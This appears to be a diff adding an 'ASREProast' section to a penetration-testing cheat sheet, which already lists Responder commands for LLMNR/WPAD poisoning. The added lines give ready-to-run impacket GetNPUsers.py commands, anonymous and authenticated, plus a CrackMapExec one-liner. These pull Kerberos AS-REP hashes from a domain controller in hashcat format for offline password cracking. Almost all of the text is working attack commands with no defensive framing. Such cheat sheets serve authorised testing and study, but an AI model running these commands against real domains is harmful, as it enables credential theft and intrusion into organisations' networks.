@@ -126,3 +126,18 @@ Examples
 ``` responder -I eth0 -A ``` Analyze mode
 
 ``` responder -I eth0 -wF ``` WPAD
+
+## ASREProast
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+
+users list dynamically queried with an LDAP anonymous bind
+
+```GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'``` 
+
+users list dynamically queried with a LDAP authenticated bind (password)
+
+```GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'``` 
+
+CrackMapExec
+
+```crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter``` 
